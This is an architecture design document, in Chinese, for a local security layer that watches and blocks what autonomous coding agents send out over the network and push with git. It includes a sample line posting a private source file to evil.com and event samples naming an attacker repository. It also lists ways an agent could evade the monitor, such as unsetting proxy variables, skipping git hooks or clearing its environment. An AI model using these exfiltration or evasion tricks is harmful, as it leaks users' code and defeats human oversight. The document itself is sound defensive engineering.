# Leash 架构设计

> Local runtime security layer for autonomous coding agents.
> 知道 agent 运行了什么、改了什么、提交了什么、往哪里发了什么，并且在高风险动作发生前有能力做 policy decision。

> **修订历史**
> - **v9**（本版本）：找到一条比 Platform Enforcement Track（第 10.2 节原方案）轻量得多的"防绕过"路径——**动态库拦截**（macOS 用 `DYLD_INSERT_LIBRARIES`、Linux 用 `LD_PRELOAD`），在被启动进程的 `connect()` 这类系统库函数入口处直接接管，不管上层用的是 HTTP、SSH 还是任意协议，只要走系统库建连接就跑不掉，而且**不需要 root、不需要苹果/微软的特殊授权**，跟现在注入环境变量、伪装 git shim 是同一个"session 级别、启动时动手脚"的路子，只是这次动的是更底层的系统调用入口而不是环境变量。因此把 Best-effort 和 Enforced 之间拆出一个新的中间档位——**Interposed Mode**（第 3.2 节），详见第 10.2 节的重新拆分。这不是 Enforced Mode 的完全替代（对苹果签名保护的系统程序无效、对存心识破并卸载它的 agent 无效），但足以把"SSH 除 git 外的用途、裸 TCP、UDP"这几个此前完全看不见的出口（第 8.1 节）收进覆盖范围，而且可以留在 Core Track 里做，不需要拆到独立的平台工程线。
> - **v8**（**v0.3 Core Track 完成**）：Dashboard（`internal/dashboard`，纯 `html/template` 服务端渲染）、Git diff --stat 捕获（`internal/gitshim/hook.go`，利用 pre-push hook 拿到的精确 SHA 对）、Runtime Sensor · File Plane MVP（`internal/filewatch`，fsnotify + 噪音目录排除 + 单 session 5000 条硬上限）、retention（`store.Prune`，默认 30 天，session 启动时自动跑）全部完成并有测试覆盖。过程中一个值得记录的教训：Dashboard 表格 CSS 一开始用 `table-layout: fixed` + 百分比列宽想解决窄列内容溢出问题，结果在窄视口下把 Details 列挤到几乎不可读；改成默认的 `table-layout: auto` + 只在需要的地方（`.fields`）加 `overflow-wrap: anywhere` 才是对的——把 `overflow-wrap` 全局加到所有 `th,td` 上会干扰浏览器自动布局算法对"首选宽度"的计算，反而让内容最多的列被挤得最窄。
> - **v2**：引入 Observe/Enforce 分级、Session Supervisor 作为架构主干、补上 Runtime Activity Plane、事件模型统一、compliance 明确要求 tamper-evident storage。
> - **v3**：`Session Supervisor` 降级为一种 Session Provider、PID tree 改用 Attribution Engine、Runtime Sensor 拆成 Process/File Plane、路线图新增 Enforce Preview 里程碑、tamper evidence 拆成 Local/Trusted Evidence 两级、"单二进制"从架构约束降级为分发目标。
> - **v4**：第三轮 review 的结论是 v3 已经对 v0.1 产生了明显的过度设计。本版本把文档拆成 v0.1 MVP（第 0 节，只有 6 个概念）和 Target Architecture（第 1 节起，定义演进边界，不是包结构），并修正了 per-session proxy port、Attribution Engine confidence 建模、Enforced Mode 独立成 Platform Enforcement Track 这三处设计。
> - **v5**（架构 review 收口）：第四轮 review 的结论是"这版可以收口了"，做最后一次范围收缩：去掉 global hook、去掉 YAML policy、去掉 `seq`、限定一个 OS（macOS）+ 一个 harness（Codex CLI），并补上三处实现级别的坑（git shim 必须在改 `PATH` 前用 `exec.LookPath` 解析真实 git 路径、shim 必须 session-scoped 临时注入、CA 信任只走环境变量不改系统信任链）。`payload_json` 明确禁止保存原始 secret/body，只存 fingerprint。
> - **v7**（本版本，**v0.2 Core Track 完成**）：v0.1 实现完成、经安全 review 修复 6 个真实漏洞（V1-V6）后发布，补了测试和 CI（GitHub Actions，macOS runner，build/vet/gofmt/test -race）。随后完成了 v0.2 全部计划项：**YAML policy 引擎**（`internal/policy/config.go`，域名 allow/deny + `github.com` 的 action 级策略），**全局 `pre-push` hook**（`internal/gitshim/hook.go`，session 级 `GIT_CONFIG_COUNT/KEY_n/VALUE_n` 注入，不碰 `~/.gitconfig`），**`leash doctor`**（覆盖状态自检），**第二个 harness**（Claude Code，`NODE_EXTRA_CA_CERTS`），**检测规则库扩充**（新增 GitLab/Slack/Stripe/Google/npm token 和 PEM 私钥头等 7 条规则），以及 **Runtime Sensor · Process Plane + Attribution Engine 第一版**（`internal/procwatch`：轮询进程表、按父子 PID 谱系归因到 session，record-only 不拦截；已用真实子进程验证端到端可用）。
> - **v6**：第五轮 review 分两部分。**架构侧**补上了文档此前完全没覆盖的一个盲区——`leashd`/proxy/git shim 自身故障时该 fail-open 还是 fail-closed（见新增的第 0.7 节），结论是安全敏感的出站动作必须 fail-closed 且绝不静默降级，非安全敏感的本地只读操作可以优雅降级；这三条已经补进第 0.9 节的 invariant 列表。**产品/商业侧**的结论更值得警惕：原始"抓住 ZCode 事件几个月窗口期"这个创业叙事已经不成立（CrowdStrike Falcon Guardian、Zscaler Agentic AI、Netskope 都已在 2026 年正面进入这个赛道），需要把定位从"没人做"换成"开发者原生、跨 harness、语义级的 coding-agent runtime 控制层"，商业模式定为 Open Core，买家结构是 Platform/DevSecOps champion + Security 经济买家的三角关系，而不是简单的"开发者 vs CISO"。这部分内容记录在新建的 [PRODUCT-STRATEGY.md](PRODUCT-STRATEGY.md) 里，不混进本文档——技术架构收口后不应该再被产品讨论稀释。

---

## 0. v0.1 MVP：先证明有人要，再长出架构

**这一节是唯一现在要照着写代码的部分，且经过四轮 review 已经收口——不再需要新的架构层面讨论。** 第 1 节及之后的内容是 Target Architecture，定义未来演进的边界，**不是** v0.1 的目录结构或包设计。

### 0.1 只允许 6 个概念

```text
Session   Proxy   GitShim   Finding   Policy   Event
```

其他一律不抽象。没有 `SessionProvider`、没有 `AttributionEngine`、没有 `SensorProvider`、没有 Detect Pipeline 的 stage/decoder registry、没有分类型 detail 表、**没有 YAML policy、没有 global git hook**（这两项第四轮 review 后确认也不是 v0.1 必需品，移到 v0.2，见第 10.1 节）。等真正出现第二种 session 启动方式、第二种 sensor、第二种查询模式逼着表结构非正规化不可的时候，再从需求里长出接口。

### 0.2 v0.1 Support Matrix（第四轮 review 后限定，不再放宽）

```text
Platform:    macOS only
Harness:     Codex CLI only（leash run -- codex）
Network:     HTTP/1.1 + HTTPS CONNECT，只做 request inspection，不做 response inspection，
             不特殊处理 WebSocket，body 有最大检查体积上限
TLS:         ephemeral 本地 Leash CA，仅通过环境变量注入信任（见 0.5 节），
             不修改系统信任链
Git:         session-scoped PATH shim，不装 global hook；只支持
             `git push <remote>` 或 `git push <url>` 这种显式写法（见 0.6 节）
Detection:   2–5 条写死的高置信度规则
Policy:      写死在代码里，无 YAML
Storage:     一张 SQLite events 表，无 seq，不存原始 secret/body
UI:          stdout only
```

这个范围故意"丑"——目的是用最少的工程量验证"同一个 session，HTTP 泄露拦得住、Git push 到陌生仓库也拦得住"这一个产品假设，不是做一个通用产品。

### 0.3 具体架构

```text
leash run -- codex
        │
        ▼
     Session（一个 struct，不是抽象）
        │
   ┌────┴─────┐
   ▼          ▼
 Proxy      Git Shim
   │          │
   └────┬─────┘
        ▼
    Scan()          -- func Scan(data []byte, ctx Context) []Finding
        ▼
   Decide()          -- func Decide(findings []Finding) Decision；allow / warn / block 写死判断，不是 YAML 引擎
        ▼
      Event
        ▼
      SQLite
```

```go
type Session struct {
    ID          string
    Command     []string
    RepoPath    string
    ProxyAddr   string
    RealGitPath string   // 见 0.6 节：必须在修改 PATH 之前解析好
    StartedAt   time.Time
}
```

流程：`leash run -- codex` → 创建 Session → 在修改 `PATH` **之前**用 `exec.LookPath("git")` 解析出真实 git 路径存进 `RealGitPath` → `net.Listen("tcp4", "127.0.0.1:0")` 拿到内核分配的空闲端口 → 注入 `HTTP_PROXY`/`HTTPS_PROXY`/`LEASH_SESSION_ID`/`LEASH_REAL_GIT`、Codex 所需的 CA 环境变量（见 0.5 节）、把 git shim 目录前置到 `PATH` → `exec codex` → Proxy 和 Git Shim 各自产生的事件都调用同一个 `Scan()` → `Decide()` 判 allow/warn/block → 写 SQLite。完。

### 0.4 目录结构

```text
leash/
├── cmd/
│   └── leash/          # CLI 入口：run 子命令
├── internal/
│   ├── session.go          # Session struct + 生命周期，不是包
│   ├── proxy/               # HTTP(S) MITM：封装成熟 proxy 库
│   ├── gitshim/             # git shim 二进制（session-scoped，不装 hook）
│   ├── detect/               # func Scan(data []byte, ctx Context) []Finding，规则写死
│   └── store/                 # SQLite，单表
└── README.md / ARCHITECTURE.md
```

### 0.5 CA 信任：只走环境变量，不碰系统信任链

这是 v0.1 里最容易被低估的一步——CA 没配对，demo 直接死在 `certificate verify failed`，根本进不到 `Scan()`。

**原则：v0.1 不修改 macOS Keychain 或任何系统信任存储，只影响被 `leash run` 拉起的进程树本身。** 生成 `~/.leash/ca.pem`，通过环境变量按 harness 注入。Codex CLI 目前的实现支持 `CODEX_CA_CERTIFICATE`（并 fallback 到 `SSL_CERT_FILE`），因此第一个 harness 选 Codex 是可行的；同时按需注入 `CURL_CA_BUNDLE` 覆盖 agent 内部可能直接调用的 `curl`。

**明确不做的事**：不假设 Python requests / npm / pip / cargo 等 agent 可能调用的子工具都会信任这个 CA——不同生态的 CA 环境变量并不统一（`REQUESTS_CA_BUNDLE`、`NODE_EXTRA_CA_CERTS`、`PIP_CERT`、`CARGO_HTTP_CAINFO` 等）。v0.1 只保证 Codex 主进程和 `curl` 这两个 demo 依赖的路径能工作，其余子工具的 TLS 兼容性是已知盲区，不在 v0.1 范围内解决，也不为此预先设计 `CAInjector`/`HarnessAdapter` 之类的抽象——等第二个 harness（例如 Claude Code，需要 `NODE_EXTRA_CA_CERTS`）真的要支持时，先写一个 `if command == "claude" { ... }` 就够，第三、第四个 harness 出现前不抽接口。

**实现中发现的一处修正**：`git` 走 HTTPS 时不认 `SSL_CERT_FILE`（那是 OpenSSL 的通用环境变量，git 的 HTTPS 传输并不读它），需要额外注入 `GIT_SSL_CAINFO` 才能让 `git push` 通过 MITM 代理时完成 TLS 握手——这是 v0.1 实现阶段才暴露出来的具体坑，补充进 CA 注入列表，不改变"只走环境变量、不碰系统信任链"这个原则。

### 0.6 Git shim：实现细节决定 demo 能不能跑通

两个必须遵守的实现约束，第四轮 review 指出这两处最容易直接让 demo 失败：

1. **真实 git 路径必须在修改 `PATH` 之前解析**：如果 shim 自己在运行时调用 `exec.LookPath("git")`，此时 `PATH` 已经被 shim 目录前置，会搜到 shim 自己，无限递归。正确做法是 Session 创建时（改 `PATH` 之前）就 `exec.LookPath("git")` 拿到绝对路径，存进 `LEASH_REAL_GIT` 注入给 shim，shim 内部永远 `exec.Command(realGit, args...)`，不再自己搜索。
2. **shim 必须是 session-scoped 临时注入，不能要求用户永久把 shim 目录加进全局 `PATH`**：只有 `leash run` 期间的子进程 `PATH` 里才有 shim 目录，session 结束后用户 shell 完全不受影响。永久安装会让每一次普通 `git` 调用都多一层 wrapper 带来的 argument/stdio/TTY/signal/credential-helper 转发风险，这是安全产品最不该引入的隐藏行为差异。

**Push 目的地解析范围也要限定**：Git 真实的 push 目的地解析涉及 `remote.pushDefault`/`branch.<name>.pushRemote`/`branch.<name>.remote`/`pushurl` 等多层配置，v0.1 不重新实现这套语义——只支持显式的 `git push <remote>` 或 `git push <url>`：shim 拿到 remote 名字后调用真实 git 的 `remote get-url --push <remote>` 得到 normalized URL，与 session 启动时 snapshot 的 remote 集合比对；遇到裸 `git push`（依赖隐式 upstream 解析）时，第一版直接 `WARN: destination unresolved by MVP shim` 或 fail closed，不猜测。

**明确不做的事**：不装 `core.hooksPath` 全局 hook（defense-in-depth 价值不影响两个 demo 能否成立，移到 v0.2）；子进程若主动清空继承的环境变量（真实发生过的场景，例如某些 MCP stdio 子进程会 `env_clear()` 后只保留白名单变量），shim 会因为拿不到 `LEASH_SESSION_ID`/`LEASH_REAL_GIT` 而失效——v0.1 不解决这个问题，只在文档里如实写清楚支持边界：**"Launch Provider 保证直接环境继承链内的 best-effort 拦截；主动清理/替换 PATH 或 Leash 环境变量的子进程不保证被覆盖。"**

### 0.7 Fail-safe 语义：Leash 自己挂了怎么办

这是此前几轮架构 review 完全没覆盖的一个盲区，第五轮补上。产品哲学："**Leash may fail, but it must never fail silently。**"——它可以坏，但绝不能在坏掉的时候悄悄把用户的流量变成裸奔，还让 Dashboard 显示 `0 violations` 这种假的安全保证。

**原则**：安全敏感的出站动作 fail-closed，非安全敏感的本地只读操作可以优雅降级，两者不能用同一条粗暴规则（"全部 fail closed"）覆盖：

| 操作 | `leashd`/shim 故障时的行为 |
|---|---|
| HTTPS/HTTP outbound（Egress Sensor） | **BLOCK**——`HTTP_PROXY` 指向的本地端口一旦不可用，请求直接连接失败，绝不自动摘掉 proxy 环境变量让流量裸奔 |
| `git push` / remote 变更（Git Sensor） | **BLOCK**——shim 内部 policy 判断不可用（panic、状态损坏）时，直接不调用真实 git 完成 push，非零退出，类似 `pre-push` hook 非零退出会阻止 push 的语义 |
| `git status` / `git log` / `git diff` 等本地只读命令 | **PASS**——shim 审计模块故障时直接 passthrough 给真实 git，不影响开发者的日常只读操作 |

**必须避免"卡死"**：fail-closed 不等于无限期 hang。`leashd` 不可达时应该快速失败并给出明确诊断（例如"Leash security proxy unavailable，session paused，run `leash restart`"），而不是让 agent 卡在几十秒的连接超时里——否则用户会为了不被卡住直接把 Leash 关掉，得到比"没装"更差的状态：装了但形同虚设，还给了假的安全感。

**显式 break-glass，而不是隐式绕过**：未来可以提供 `leash resume --unprotected` 这类显式旁路，但必须终端醒目提示"网络流量不再被检查"、记录到审计事件里、且默认不允许 policy 里关闭这个提示。关键不是"永远不让用户绕过"，而是"绝不替用户悄悄绕过"。

v0.1 只需要落三条 invariant（见第 0.9 节），不需要 HA/watchdog/自动重连这类机制——这些和第 0.6 节的教训一样，是等真实需要时再加的复杂度，不是现在就要实现的工程量。

### 0.8 数据模型：一张表，无 `seq`，不存原始 secret/body

```sql
CREATE TABLE events (
    id            INTEGER PRIMARY KEY,
    session_id    TEXT NOT NULL,
    ts            INTEGER NOT NULL,
    kind          TEXT NOT NULL,   -- network | git_push
    severity      TEXT NOT NULL,
    decision      TEXT NOT NULL,   -- allow | warn | block
    payload_json  TEXT NOT NULL
);
-- 时间线查询：ORDER BY ts, id
```

**不加 `seq`**：Proxy 在主进程里、Git Shim 是独立子进程，两者若都要给同一个 session 原子分配单调递增的 `seq`，会立刻需要 central writer/IPC/事务/跨进程锁——这些不是 v0.1 该解决的问题。`id INTEGER PRIMARY KEY` + `ts` 配合 `ORDER BY ts, id` 对 demo 足够，真正需要 replay/event causality 保证时再加 session-local sequence。

**`payload_json` 不重复表里已有的顶层字段**（比如不用再塞一遍 `kind`），且**明确禁止保存原始 secret 或原始 body/diff**：

```json
{"host": "evil.com", "method": "POST", "matched_rule": "generic_secret"}
{"remote": "git@github.com:attacker/repo.git"}
```

命中的 secret 只存 `{"rule": "openai_api_key", "fingerprint": "sha256:..."}` 这类指纹，不存明文；v0.1 里 HTTP body 命中规则后直接 `scan → decision → discard`，不落库原文；git remote URL 落库前要先剥掉 `https://token@...` 这类 userinfo。一个号称防泄露的工具，第一版数据库不能自己变成一份 secrets collection。

### 0.9 需要保留的极少数不变量（reserve seams, don't implement abstractions）

- `session_id` 不等同于 PID
- 每条 `events` 都必须有 `session_id`
- `kind` 字段可扩展（新增事件类型不改表结构，靠 `payload_json`）
- `Scan()` 和 `Decide()` 是分离的两步（detection 产出 finding，policy 判断单独做）
- 任何时候都不能把 best-effort 的结果包装成"已强制拦截"的措辞
- git shim 只能 session-scoped 临时注入，不能要求用户永久装进全局 `PATH`
- 安全敏感的出站动作（HTTP(S) outbound、git push）在 Leash 自身故障时必须 fail-closed，绝不静默降级为不受保护
- 任何旁路/降级必须由用户显式触发并可见提示，Leash 不能替用户悄悄绕过自己（见第 0.7 节）

### 0.10 Demo 目标与现实工作量

```text
leash run -- codex
```

现场演示两件事：① Codex 尝试把 `.env` 内容当 payload POST 出去 → BLOCK；② Codex 尝试 `git push <remote>` 到一个陌生仓库 → BLOCK。命令行输出即可，不需要 Dashboard。

**现实工作量估计**（熟悉 Go、没做过 MITM proxy 的工程师，独立完成）：

| 模块 | 预估 |
|---|---|
| `leash run` / env 注入 / session 生命周期 | 0.5–1 天 |
| Git shim（真实路径解析 + 显式 push 校验） | 1.5–2 天 |
| CA 生成 + CONNECT MITM + 动态证书 | 2–3 天 |
| Codex/curl 的 proxy + CA 兼容性调试 | 1–2 天 |
| Scan + 写死的 policy | 0.5–1 天 |
| SQLite + CLI 事件输出 | 0.5–1 天 |
| 集成测试 / demo 打磨 | 1.5–2 天 |

合计约 **8–12 个有效工程日**，比"两周"字面数字偏紧但基本可信；TLS/proxy 兼容性调试是最大的不确定性来源，不是代码量。

**架构 review 到此收口**：这份文档不再需要新一轮的架构层面讨论。下一步应该是针对 git shim / MITM / CA injection 具体实现的代码 review，而不是继续推演 ARCHITECTURE.md。

---

## 1. Target Architecture 说明

**从这里开始，文档描述的是产品的目标形态和长期演进边界，不是下一步要写的代码结构。** 只有当 v0.1 验证了"有人真的需要这个东西"、且某个具体需求（第二种 session 启动方式、第二种 sensor、attribution 精度不够用）逼出了对应的抽象时，才把这里描述的设计对应部分实现出来。

## 2. 背景与定位

2026 年 9 月，"ZCode 偷偷上传你的 Git 历史"、"OpenAI 内部仓库被攻破"等事件登上 HN 头条。企业现状是：每个团队都在跑五六个来历不明的 agent harness（Claude Code / Cursor / Codex / 自研 agent）+ 几十个第三方 skill / plugin / MCP server，但没有人知道这些 agent 到底往外发了什么、提交了什么、执行了什么命令。

Leash 的长期定位：

> 一个专门针对 autonomous coding agent 的本地运行时安全层——覆盖网络出口、Git 语义、进程执行三个平面（外加供应链静态扫描），统一成一条可归因、可检阅的会话时间线，并在两种保证等级（Best-effort / Enforced）下分别对用户负责任地承诺"看得到什么"和"能拦住什么"。

## 3. 核心洞察

### 3.1 Egress Plane 与 SCM Semantic Plane：为什么两层缺一不可

HTTP(S) 出口代理的原理是 agent 进程读取 `HTTP_PROXY` / `HTTPS_PROXY` 环境变量，把流量转发给本地代理，代理做 TLS MITM 解密后审计。**但企业里绝大多数 git remote 走 SSH，不走 HTTP_PROXY。** 如果 agent 执行 `git push` 把整个仓库历史推到一个陌生的 SSH remote，纯网络代理**完全看不到**这个动作——这恰恰是"ZCode 上传 Git 历史"事件最典型的攻击路径。

反过来，即使未来做到 OS 级网络过滤、能看到 `process → github.com:22` 这条连接，也不知道 push 的是哪个 repository、哪些 refs、是不是 non-fast-forward、remote 是不是刚被悄悄改过。而 Git 语义层知道这些，却完全不知道 `requests.post("https://evil.com", data=open("src/private.go").read())`。

结论：两个平面解决的是**不同层次的信息**，不能互相替代，必须并存：**Egress Plane**（出口平面）和 **SCM Semantic Plane**（版本控制语义平面）。

### 3.2 Best-effort / Interposed / Enforced：必须现在就承认的信任边界

proxy + git shim 本身已经能做 `BLOCK`，不只是记录，所以关键区别不是"观察 vs 拦截"，而是"**拦截面能不能被绕过、覆盖面有多宽**"。v9 拆出三档，不再是简单的二选一：

| 等级 | 承诺 | 实现方式 | 覆盖面 | 适用场景 |
|---|---|---|---|---|
| **Best-effort Mode**（v0.1 起） | 拦截到的动作可以阻断，但 agent 与 Leash 同权限运行，agent 可以主动绕过拦截面本身（比如 `unset HTTP_PROXY`） | proxy env 注入 + git shim/hook，用户态运行 | 只有"愿意配合"的 HTTP(S) 流量 + git push | 开发者本机、早期企业试点 |
| **Interposed Mode**（新增，Core Track 内即可做，见第 10.2 节） | 拦截点从"应用层是否配合"下沉到"进程调用系统库建立连接的那一刻"，agent 自己选不选配合不再重要；但对苹果/系统签名保护的程序无效，对存心识别并卸载拦截模块的 agent 也无效 | 动态库拦截（`DYLD_INSERT_LIBRARIES` / `LD_PRELOAD`），session 级注入，不需要 root、不需要平台特殊授权 | 所有经过系统库 `connect()` 的流量（HTTP/SSH/裸 TCP/UDP 等），不只是愿意配合的 HTTP(S) | 想要"基本绕不过去"但还不需要企业级强制管控的场景 |
| **Enforced Mode**（独立的 Platform Enforcement Track，见第 10.2 节） | agent 无法绕过拦截面：直连出口被 OS 内核层拦截，agent 无法停止特权组件 / 篡改审计日志，对抗性场景下依然成立 | 平台级特权组件（EndpointSecurity/eBPF/WFP），至少先支持一个 OS | 理论上完整覆盖，含 Interposed Mode 覆盖不到的场景 | 企业强制管控 |

## 4. 产品能力面（Target）

| # | 能力面 | 解决什么问题 | 核心机制 | 何时出现 |
|---|------|------------|---------|---|
| ① | **Egress Sensor** | 阻止 agent 通过 HTTP(S) 把源码/密钥发到未知域名 | 本地 MITM 代理 | v0.1（第 0 节范围内） |
| ② | **Git Sensor** | 补上 Egress Sensor 看不到的 SSH/本地 git 操作盲区 | 全局 `git` shim + `core.hooksPath` 全局 hook | v0.1（第 0 节范围内） |
| ③ | **Runtime Sensor · Process Plane** | agent 真正高风险的动作（`scp`/`aws s3 cp`/`gh gist create`/`docker run` 等）此前完全没有 evidence | 记录进程谱系，直接服务 Attribution Engine | v0.2，Attribution Engine 也在此时才出生 |
| ④ | **Runtime Sensor · File Plane** | 文件级 mutation（写入同步盘、改写/删除敏感文件） | open/write/rename/unlink + before/after hash | v0.3+ |
| ⑤ | **Supply-chain Scanner** | skill/plugin/MCP server 声明了什么权限，风险打分 | 静态扫描配置目录。**不是产品的核心 moat**，优先级最低 | v0.6（Core Track 尾部） |
| ⑥ | **Dashboard / Report** | 把所有平面的事件统一成一条时间线，可回放、可导出合规报告 | 内嵌 Web Dashboard，report 建立在 tamper-evident 存储之上 | v0.3（时间线）/ v0.5（合规报告） |

真正形成产品差异化的不是任何单一 sensor，而是 **session attribution + runtime behavior + network/git policy + replay** 这个组合。

## 5. 系统架构（Target）

### 5.1 Session Manager：不能把"如何启动"当成架构前提

`leash run -- <agent>` 只是建立 Session 边界最简单可靠的一种方式，不是 Session 的定义。Cursor/VS Code extension、后台 MCP host、企业自研常驻 agent daemon，都不一定通过这条命令启动：

```text
Session Manager
│
├── Launch Provider        leash run -- codex        （v0.1 实现，唯一必需）
├── Attach Provider         leash attach <pid>         （v0.2+，出现真实需求后再建）
├── Harness Adapter         Cursor / VS Code / 自研 IDE agent（后续）
└── System Provider         企业已注册的长驻 agent daemon    （企业场景）
```

### 5.2 PID tree 不等于 session attribution：Attribution Engine 的证据模型

**修正**：Attribution Engine 不能把 cgroup / Windows Job Object / macOS EndpointSecurity responsible audit token 压成同一套 `high/medium/low` confidence——三者不是同一种 primitive：

- **Linux cgroup v2**：如果 Leash 拥有并正确 delegate 了 cgroup subtree，被委托者在自己的 subtree 内可以移动进程，但没有共同祖先 `cgroup.procs` 的写权限就不能把进程搬出去——这是内核强制的 containment，但**前提是 Leash 有能力创建并拥有那个 boundary**；如果只是与 agent 同 UID 的用户态进程，containment 强度会显著下降。
- **Windows Job Object**：进程被放入 Job 后，通过普通 `CreateProcess` 创建的子进程默认也属于该 Job（除非显式设置 breakaway 权限），这是相当好的 execution boundary。但 `Win32_Process.Create`、Service、Task Scheduler、COM server 等方式创建的进程不会自动属于 Job——membership 证明不了"所有由 agent 因果触发的操作都在这个 container 里"。
- **macOS responsible audit token**：本质是 provenance 信号（"kernel 认为哪个进程对这个进程负责"），不是 containment 机制，和前两者不是同一语义，不能放在同一个强度量表上比较。

因此不能在事件上直接存一个派生好的 `confidence: high`，而要保留原始平台证据，让 assurance 在查询/展示层派生：

```yaml
attribution:
  scope: descendant
  evidence:
    launch: { matched: true }
    process_membership:
      mechanism: cgroup_v2   # 或 windows_job_object / none（macOS）
      member: true
      boundary_owner: privileged_leash   # 或 user，强度不同
    responsible_process:
      mechanism: endpointsecurity_audit_token   # 仅 macOS
      matched_session: true
    delegated_correlation: { matched: false }
```

不要把这份证据直接压缩存成 `events.attribution = "high"`——算法以后升级，历史原始 evidence 还能重新计算 assurance；只存派生结论就再也无法追溯当初为什么判定为 high。

### 5.3 Egress event 的 session 归属：listener routing ≠ client identity

**修正**：per-session 独立 proxy 端口这个设计本身保留，但论证要准确。实现上用 `net.Listen("tcp4", "127.0.0.1:0")` 让内核分配空闲端口并立即持有 listener，不需要自己维护端口分配表、不存在"先探测空闲端口再 bind"的 TOCTOU 问题，agent 也不需要"发现"端口——Session Manager 直接把地址通过环境变量注入。

但必须明确：**`listener_id → session_id` 是确定的 routing 关系，不等于"连接这个 listener 的客户端确实属于该 session"**。两个具体风险需要在文档和 coverage 状态里如实体现：

- **Stale-listener reuse**：session A 结束、端口被内核回收后重新分配给 session B，如果 session A 遗留的子进程仍持有旧的 `HTTPS_PROXY` 地址并继续连接，流量会被错误记为 session B 的事件。
- **本机进程 spoofing**：任何知道该端口的本机进程都可以直接连接上来，事件会被记为该 session 所有，而它其实与该 session 无关。

v0.1 不解决这两个问题（第 0.5 节已如实标注为 `launch_scoped_best_effort`）。v0.2+ 如果需要更强的 client 身份保证，可选引入 per-session proxy credential（例如 `Proxy-Authorization` 携带 session nonce），但这会引入新的 harness/client 兼容性假设（要确认 agent 用到的所有 HTTP client、git 子进程、npm/pip 等是否支持该认证方式），不能在架构上假设全部支持，因此设计为可选增强而非必需项：不支持时降级为 `attribution_strength: weak`（仅 port-based），支持时升级为双因子。

### 5.4 架构图（Target）

```
                          Session Manager
                (Launch / Attach / Harness Adapter / System Provider)
                                    │
                       为该 session 分配专属 proxy 端口（net.Listen(:0)）
                     注入 HTTP_PROXY / HTTPS_PROXY / CA / Git shim PATH
                                    │
                                    ▼
                          Attribution Engine
              原始平台证据（cgroup / Job Object / audit token）
                    + process ancestry + delegated correlation
                        → 派生 assurance，而非直接存等级
                                    │
             ┌──────────────────────┼──────────────────────┐
             │                      │                      │
             ▼                      ▼                      ▼
      Egress Sensor            Git Sensor         Runtime Sensor
      HTTP/TLS 解密           shim + hooks      Process Plane（早）/ File Plane（晚）
             │                      │                      │
             └──────────────────────┼──────────────────────┘
                                    ▼
                          Event Normalizer
                                    │
                                    ▼
                        ┌──── Detect Pipeline ────┐
                        │  decode → pattern/entropy │
                        │  → confidence scoring     │
                        └──────────┬─────────────────┘
                                    │
                     ┌──────────────┴──────────────┐
                     ▼                              ▼
              Policy Gate（同步）              Async Enrichment
              allow / warn / block             diff parse、hash、
              只做最小必要判断                  skill scan 等重活
                     │                              │
                     └──────────────┬───────────────┘
                                    ▼
                              Event Store
                    SQLite（元数据/索引）+ Blob Store（body/diff）
                                    │
                          ┌─────────┴─────────┐
                          ▼                   ▼
                      Dashboard             Report
                                        （需 tamper-evident storage，见第 9 节）
```

> v0.1 的实际目录结构见第 0.3 节，不是下面这份。这份是长期演进后可能长成的样子：

```text
leash/
├── cmd/
│   ├── leashd/
│   └── leash/
├── internal/
│   ├── session/{manager,provider,attribution}/
│   ├── sensor/{egress,git,runtime/{process,file}}/
│   ├── detect/
│   ├── skillscan/
│   ├── policy/
│   ├── store/
│   └── dashboard/
├── configs/
└── README.md / ARCHITECTURE.md
```

### 5.5 Git Sensor：shim 是主拦截点，全局 hook 是兜底

Git 支持 `git config --global core.hooksPath ~/.leash/git-hooks`，对所有仓库集中生效；`pre-push` hook 本身也能拿到 remote name/location 和 local/remote 的 ref、sha。shim 相对 hook 的真正价值在**强制力**：`git push --no-verify` 或 `-c core.hooksPath=/dev/null` 能跳过 hook，但更难绕开 PATH 更靠前的 shim（除非 agent 直接调用绝对路径的系统 git 或用 libgit2/go-git 等库，这两种情况 shim 也拦不住，如实标注为盲区）。

风险判断看 **normalized remote identity**（`scheme + host + org + repo`）相对 session 起始状态是否发生未预期变化，而不是看 remote 的名字（`origin` 只是本地起的名字）。

### 5.6 Detect Pipeline（Target）：v0.1 只是一个函数

长期形态是 Input Normalizer → Decode Pipeline → Detect Engine → Finding → Policy Gate 的流水线，各 sensor 共用；Detect Engine 只输出带 confidence 的 finding，不直接做 block 决策，避免熵检测的高误报率毁掉可用性。但 v0.1（第 0.2 节）里这整条流水线就是一个 `Scan(data []byte, ctx Context) []Finding` 函数，内部写死已知密钥正则、`.env` 标记、git pack 特征、简单熵检测——没有 plugin pipeline、没有 decoder registry、没有 stage interface；等真的需要处理 multipart/base64/gzip 解包，或者 network/git/process 三种输入形态的检测逻辑开始明显重复时，再抽出流水线。

## 6. 数据模型（Target）

v0.1 只有第 0.4 节那张单表。以下是长期查询模式逼出正规化需求之后的目标 schema。

### 6.1 事件模型：统一 `events` 主表 + 分类型 detail 表

```
events
├── id / session_id / seq / ts
├── kind             -- network / git_commit / git_push / process_exec / file_mutation / skill_scan
├── attribution        -- 见 5.2 节的原始证据模型
├── severity / decision / policy_version
└── metadata（指向 detail 表的引用）
```

配套 detail 表：`network_event_details`、`git_event_details`、`process_event_details`、`file_event_details`、`scan_event_details`，均以 `event_id → events.id` 关联，`policy_violations.event_id` 是真正的外键。

### 6.2 Git 事件：commit 和 push 是两种生命周期

拆成 `type: commit / push / remote_add / remote_change / reset / rebase`。push 用 `normalized_remote / local_ref / local_sha / remote_ref / remote_sha / non_fast_forward`（而不是简单的 `is_force_push` 布尔位，因为改写历史可以通过 `git push origin +main` 这种 refspec 实现而不带 `--force` 字样）。

### 6.3 存储策略

- **SQLite**（`modernc.org/sqlite`，纯 Go 无 cgo）只存事件元数据、索引、finding、policy、session。
- **大对象**（请求体、大 diff）落本地 `~/.leash/blobs/`，按 `sha256` 命名、zstd 压缩，SQLite 只存指针。
- **capture mode** 默认 `redacted`，`full` 需显式开启；配合可配置 **retention**（7d/30d/custom）。

## 7. 技术栈

### 7.1 Leash Core：单二进制是分发目标，不是架构约束

`leashd` 的控制面（CLI、daemon、事件存储、policy 引擎、Dashboard）可以永远是单二进制。真正需要 OS 原生特权组件（System Extension/eBPF+capabilities/kernel driver）、不可能是裸 Go 二进制的，是第 10.2.2 节的 Platform Enforcement Track。v0.1-v0.3（Egress + Git + Process/File Plane 的用户态实现）不需要特权组件；第 10.2.1 节新加的 Library Interposition（Interposed Mode）也不需要——它只是随 `leash run` 一起分发一个小的原生动态库，session 启动时注入到被启动的进程里，不需要 root、不需要额外的系统安装步骤，"下载一个 binary 就运行"这条分发承诺在 Interposed Mode 也成立。

### 7.2 其余选型

